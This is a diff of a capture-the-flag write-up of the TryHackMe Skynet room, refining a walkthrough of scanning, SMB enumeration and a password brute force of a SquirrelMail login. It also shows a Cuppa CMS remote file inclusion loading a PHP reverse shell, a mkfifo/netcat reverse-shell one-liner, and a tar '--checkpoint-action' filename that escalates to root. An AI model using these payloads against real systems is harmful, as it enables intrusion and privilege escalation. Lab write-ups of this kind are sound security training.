@@ -54,9 +54,9 @@ Nmap done: 1 IP address (1 host up) scanned in 17.19 seconds
 ```
 A full nmap scan with ```-p-``` also returned the same results. 
 ```
-ajread@aj-ubuntu:~/TryHackMe$ nmap -p- 10.10.100.158
+ajread@aj-ubuntu:~/TryHackMe$ nmap -p- [REDACTED] 
 Starting Nmap 7.80 ( https://nmap.org ) at 2022-02-21 20:41 EST
-Nmap scan report for 10.10.100.158
+Nmap scan report for [REDACTED] 
 Host is up (0.091s latency).
 Not shown: 65529 closed ports
 PORT    STATE SERVICE
@@ -69,7 +69,7 @@ PORT    STATE SERVICE
 
 Nmap done: 1 IP address (1 host up) scanned in 58.15 seconds
 ```
-
+It looked like the machine had some e-mail capabilities based on the pop and imap. It also appeared to be hosting some form of SMB share. 
 # Enumeration
 I checked out the http service and I found some interesting directories. 
 ```
@@ -97,7 +97,7 @@ Gobuster v2.0.1              OJ Reeves (@TheColonial)
 2022/02/21 21:07:52 Finished
 =====================================================
 ```
-I first went after the SMB portion of the machine. I used smbmap to scan for available shares. 
+The /squirrelmail directory is most likely related to the pop3 and imap services I saw in my nmap scans. I first went after the SMB portion of the machine. I used smbmap to scan for available shares. 
 ```
 ajread@aj-ubuntu:~/TryHackMe$ smbmap -H [REDACTED]
 [+] Guest session   	IP: [REDACTED]:445	Name: [REDACTED]                                    
@@ -108,7 +108,7 @@ ajread@aj-ubuntu:~/TryHackMe$ smbmap -H [REDACTED]
 	milesdyson                                        	NO ACCESS	Miles Dyson Personal Share
 	IPC$                                              	NO ACCESS	IPC Service (skynet server (Samba, Ubuntu))
 ```
-It looked like there is a user name milesdyson on the system. Then, I looked at the anonymous share. 
+It looked like there is a user name ```milesdyson``` on the system. I kept that usernanme in mind. I looked at the anonymous share since it had READ ONLY access. 
 ```
 ajread@aj-ubuntu:~/TryHackMe$ smbclient -U anonymous //[REDACTED]/anonymous
 Enter WORKGROUP\anonymous's password: 
@@ -135,7 +135,7 @@ smb: \logs\> ls
 		9204224 blocks of size 1024. 5831532 blocks available
 smb: \logs\> 
 ```
-Looking at the log files, only log1.txt has data, which appeared to be passwords to use for cracking credentials. I will definitely keep these in mind. Could they be used for milesdyson user? 
+Looking at the log files, only log1.txt has data, which appeared to be passwords to use for cracking credentials. I will definitely keep these in mind. Could they be used for ```milesdyson``` user? 
 ```
 ajread@aj-ubuntu:~/TryHackMe/practice$ cat log1.txt 
 cyborg007haloterminator
@@ -170,13 +170,13 @@ Walterminator
 79terminator6
 1996terminator
 ```
-Remembering the enumeration I did with gobuster, I went back to the ```/squirrelmail``` directory. What if the log1.txt was a list of passwords to try as user milesdyson? The ```attention.txt``` file affirmed my suspicion. 
+Remembering the enumeration I did with gobuster, I went back to the ```/squirrelmail``` directory. What if the log1.txt was a list of passwords to try as user ```milesdyson```? The ```attention.txt``` file affirmed my suspicion. 
 ```
 ajread@aj-ubuntu:~/TryHackMe/practice$ cat attention.txt 
 A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.
 -Miles Dyson
 ```
-So, I set up burpsuite intruder to use multiple payloads against the ```secretkey=``` position of the POST request to the squirrelmail service. See the POST request to log in below. As seen, I logged in as user ```milesdyson``` with password ```test```.
+So, I set up burpsuite intruder to use multiple payloads against the ```secretkey=``` position of the POST request to the squirrelmail service. See the POST request to log in below. 
 ```
 POST /squirrelmail/src/redirect.php HTTP/1.1
 Host: [REDACTED]
@@ -195,7 +195,7 @@ Connection: close
 
 login_username=milesdyson&secretkey=§test§&js_autodetect_results=1&just_logged_in=1
 ```
-I loaded in log1.txt as the payload in intruder and ran. There are a total of 31 possible passwords in the log1.txt file. Burpsuite took some time to run against the target but I eventually found the password based on the 302 response from the service. With the password, I logged into the mail service as user milesdyson. 
+I loaded in ```log1.txt``` as the payload in intruder and ran burpsuite. There were a total of 31 possible passwords in the ```log1.txt``` file. Burpsuite took some time to run against the target but I eventually found the password based on a 302 response from the service. With the password, I logged into the mail service as user ```milesdyson```. 
 ```
 HTTP/1.1 302 Found
 Date: Thu, 24 Feb 2022 18:47:51 GMT
@@ -204,19 +204,19 @@ Expires: Sat, 1 Jan 2000 00:00:00 GMT
 Cache-Control: no-cache, no-store, must-revalidate
 Pragma: no-cache
 ```
-There are total of 3 emails within the user milesdyons's inbox. Two of them are from serenakogan. One of the emails from her is in binary. The other appears to be song lyrics. But, one of the emails in milesdyson's inbox from skynet@skynet provided smb credentials to use.
+There were total of 3 emails within the user ```milesdyons'``` inbox. Two of them are from ```serenakogan```. One of the emails from her is in binary. The other appears to be song lyrics. The final email in ```milesdyson's``` inbox was from ```skynet@skynet``` and it provided smb credentials to use.
 ```
 We have changed your smb password after system malfunction.
 Password: [REDACTED]
 ```
-I used the credentials to log into the ```milesdyson``` share that I saw earlier. 
+I used the credentials to log into the ```milesdyson``` share that I saw earlier using smbmap. 
 ```
 ajread@aj-ubuntu:~/TryHackMe$ smbclient -U milesdyson //[REDACTED]/milesdyson
 Enter WORKGROUP\milesdyson's password: 
 Try "help" to get a list of possible commands.
 smb: \> 
 ```
-There are a bunch of files within the share. But, the most interesting file was the ```important.txt``` file within the ```notes``` directory. 
+There were a bunch of files within the share. But, the most interesting file was the ```important.txt``` file within the ```notes``` directory. 
 ```
 smb: \> ls
   .                                   D        0  Tue Sep 17 05:05:47 2019
@@ -300,7 +300,7 @@ body {
 </body>
 </html>
 ```
-It didnt look like anything special was on the first page. I ran gobuster against the site and found some more interesting directories to investigate. 
+It didnt look like anything special was on the first page of the supposed CMS. I ran gobuster against the site and found some more interesting directories to investigate. 
 ```
 ajread@aj-ubuntu:~/TryHackMe/practice$ gobuster -u http://[REDACTED]/[REDACTED]/ -w /home/ajread/resources/wordlists/SecLists/Discovery/Web-Content/common.txt 
 
@@ -325,9 +325,9 @@ Gobuster v2.0.1              OJ Reeves (@TheColonial)
 2022/02/24 14:15:50 Finished
 =====================================================
 ```
-When I navigated to the /administrator page, I was presented with a login screen for Cuppa CMS. I did some googling to find that there is a remote/local file inclusion vulnerability with Cuppa CMS (https://www.exploit-db.com/exploits/25971).
+When I navigated to the /administrator page, I was presented with a login screen for Cuppa CMS. I did some googling to find that there is a remote/local file inclusion vulnerability with Cuppa CMS (https://www.exploit-db.com/exploits/25971) that I could use. 
 # Initial Access
-With the LFI/RFI vulnerability, I set up a php reverse shell using pentest monkey (https://pentestmonkey.net/tools/web-shells/php-reverse-shell), changing the IP and port as needed. Then, I started a python http server on my local machine in the directory where the reverse shell is stored.
+With the LFI/RFI vulnerability, I set up a php reverse shell using pentest monkey (https://pentestmonkey.net/tools/web-shells/php-reverse-shell), changing the IP and port as needed. Then, I started a python http server on my local machine in the directory where the reverse shell was stored.
 ```
 ajread@aj-ubuntu:~/resources/revshells$ sudo python -m http.server 80
 ```
@@ -336,11 +336,11 @@ I made sure to set up a netcat listener on my local machine.
 ajread@aj-ubuntu:~/TryHackMe/practice$ nc -lnvp 9999
 Listening on 0.0.0.0 9999
 ```
-Then, I navigated to the LFI/RFI vulnerable location for the CMS and input the location of my local machine and grabbed the reverse shell.
+Then, I navigated to the LFI/RFI vulnerable location for the CMS and input the location of my local machine, which executed the reverse shell. 
 ```
 http://[REDACTED]/[REDACTED]/administrator/alerts/alertConfigField.php?urlConfig=http://[REDACTED]:80/php-reverse-shell.php
 ```
-And, it dropped me into a shell!
+And, it worked! 
 ```
 ajread@aj-ubuntu:~/TryHackMe/practice$ nc -lnvp 9999
 Listening on 0.0.0.0 9999
@@ -354,7 +354,7 @@ $ id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 $ 
 ```
-I could also see the machine call out to my local machine. 
+I could also see the machine call out to my local machine via the http server. 
 ```
 ajread@aj-ubuntu:~/resources/revshells$ sudo python -m http.server 80
 [sudo] password for ajread: 
@@ -367,7 +367,7 @@ $ wc -c user.txt
 33 user.txt
 ```
 # Privilege Escalation 
-Within the home directory of milesdyson, there was an interesting backup file that is executed by root. 
+Within the home directory of ```milesdyson```, there was an interesting backup file that is executed by root. 
 ```
 www-data@skynet:/home/milesdyson/backups$ cat backup.sh
 cat backup.sh
@@ -375,17 +375,29 @@ cat backup.sh
 cd /var/www/html
 tar cf /home/milesdyson/backups/backup.tgz *
 ```
-It looked like the shell script moves to the location of the website and compresses everything as a method of backup. I found this website that explains an exploit for tar using checkpoints(https://swepstopia.com/wildcards-tar-and-checkpoints/). According to the site, I first needed to create a shell script and place it in the location where the tar takes place. The shell script would call back to my local machine at a specific port. 
+Based on file permissions, I couldnt simply change the shell script to elevate privilege. 
+```
+www-data@skynet:/home/milesdyson/backups$ ls -la 
+ls -la 
+total 4584
+drwxr-xr-x 2 root       root          4096 Sep 17  2019 .
+drwxr-xr-x 5 milesdyson milesdyson    4096 Sep 17  2019 ..
+-rwxr-xr-x 1 root       root            74 Sep 17  2019 backup.sh
+-rw-r--r-- 1 root       root       4679680 Feb 24 16:20 backup.tgz
+```
+It looked like the shell script moved to the location of the website and compressed everything, using tar, as a method of backup. I found this website that explained an exploit for tar using checkpoints (https://swepstopia.com/wildcards-tar-and-checkpoints/). Checkpoints were originally created so that tar could conduct specific actions during its process if, for example, it is archiving a massive file/directory. According to the site, I could set up a checkpoint within tar that would be a reverse shell to my local machine. 
+
+Following the site, I first needed to create a shell script and place it in the location where the tar/backup takes place. The shell script needed to call back to my local machine at a specific port. 
 ```
 www-data@skynet:/var/www/html$ echo -n "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [REDACTED] 4444 >/tmp/f" > shell.sh
 <ifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [REDACTED] 4444 >/tmp/f" > shell.sh
 ```
-Then, I had to set up a checkpoint action that would execute the shell script. 
+Then, I had to set up a checkpoint action for tar that would execute the shell script. 
 ```
 www-data@skynet:/var/www/html$ touch "/var/www/html/--checkpoint-action=exec=sh shell.sh"
 <ml$ touch "/var/www/html/--checkpoint-action=exec=sh shell.sh"  
 ```
-I set up a netcat listener to handle the shell script calling from the victim. 
+I set up a netcat listener to catch the reverse shell on my local machine. 
 ```
 ajread@aj-ubuntu:~/TryHackMe/$ nc -lnvp 4444
 Listening on 0.0.0.0 4444
